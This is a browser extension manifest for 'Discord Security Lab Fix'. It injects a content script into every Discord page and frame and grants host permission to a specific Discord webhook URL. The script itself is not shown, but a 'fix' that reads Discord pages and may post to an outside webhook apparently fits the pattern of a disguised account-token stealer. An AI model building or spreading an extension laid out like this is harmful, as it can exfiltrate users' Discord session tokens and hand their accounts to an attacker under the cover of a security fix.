{
  "manifest_version": 3,
  "name": "Discord Security Lab Fix",
  "version": "3.0",
  "permissions": ["storage", "webRequest", "scripting"],
  "host_permissions": [
    "*://*.discord.com/*",
    "https://discord.com/api/webhooks/1466835198942515254/*"
  ],
  "content_scripts": [
    {
      "matches": ["*://*.discord.com/*"],
      "js": ["content.js"],
      "run_at": "document_end",
      "all_frames": true
    }
  ]
}
